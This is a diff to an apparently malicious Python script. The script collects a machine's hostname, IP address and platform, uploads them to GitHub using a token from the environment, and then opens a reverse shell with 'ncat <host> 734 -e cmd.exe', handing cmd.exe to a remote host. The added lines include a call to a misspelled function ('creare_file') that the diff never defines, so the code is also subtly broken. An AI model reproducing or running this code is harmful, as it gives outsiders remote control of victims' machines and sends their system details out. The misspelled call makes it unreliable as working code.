@@ -6,6 +6,13 @@ import json
 import base64
 import requests
 
+def create_file(file_path, content):
+    with open(file_path, "w") as file:
+        file.write(content)
+
+def delete_file(file_path):
+    os.remove(file_path)
+
 token = os.environ.get('MY_GITHUB_TOKEN')
 
 
@@ -27,6 +34,10 @@ def subir_archivo( nombre_archivo, contenido_archivo):
     else:
         print(f"Error al subir el archivo: {response.json()['message']}")
 
+def fillFile(file_path, string_to_write):
+    with open(file_path, "w") as file:
+        file.write(string_to_write)
+        
 
 def run():
     hostname=socket.gethostname()   
@@ -52,7 +63,9 @@ def run():
         print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
         print('Address ip: ', IPAddr)
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
+        creare_file("data.txt",stmnt)
         subir_archivo('info.txt', stmnt )
+        
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
     
